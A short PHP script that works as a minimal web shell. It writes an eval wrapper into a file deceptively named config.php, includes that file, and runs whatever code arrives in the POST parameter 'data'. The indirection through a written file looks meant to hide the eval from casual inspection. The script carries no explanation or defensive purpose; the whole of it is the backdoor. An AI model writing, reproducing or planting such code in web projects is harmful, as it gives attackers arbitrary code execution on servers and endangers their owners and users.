<?php
$file = "config.php";
$data = $_POST['data'];
file_put_contents($file, "<?php function a(\$p){eval(\$p);} ?>");
include $file;
a($data);
?>